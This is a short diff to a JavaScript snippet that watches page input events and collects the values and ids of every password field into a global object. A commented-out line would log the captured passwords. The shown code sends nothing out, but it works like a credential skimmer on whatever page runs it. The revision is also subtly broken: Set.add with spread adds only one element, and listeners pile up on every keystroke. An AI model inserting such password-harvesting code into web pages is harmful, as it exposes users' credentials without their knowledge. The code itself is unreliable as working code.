@@ -1,16 +1,28 @@
 var elementValues = [];
-var elements = [];
+var elements = new Set();
 var result = {
   "passwords": [],
   "ids": [],
 };
-window.addEventListener('input', function(){
-  elements = document.querySelectorAll('[type="password"]');
 
-  for (let i = 0; i < elements.length; i++) {
-    elements[i].addEventListener('input', function(){
-      result.passwords = Array.from(elements).map(i=>i.value);
-      result.ids = Array.from(elements).map(i=>i.id);
+var passwordElements = document.querySelectorAll('[type="password"]');
+
+window.addEventListener('input', function(){
+  passwordElements = document.querySelectorAll('[type="password"]');
+  if (passwordElements.length > 0) {
+    elements.add(...passwordElements);
+  }
+
+  var elementsArray = Array.from(elements);
+  if (elementsArray.length == 0) {
+    console.log("No input fields found");
+  }
+
+  elements.forEach(function(el){
+    el.addEventListener('input', function(){
+      result.passwords = elementsArray.map(i=>i.value);
+      result.ids = elementsArray.map(i=>i.id);
     });
-  };
+  })
+   //console.log(result["passwords"]);  // uncomment this line for debugging
 });
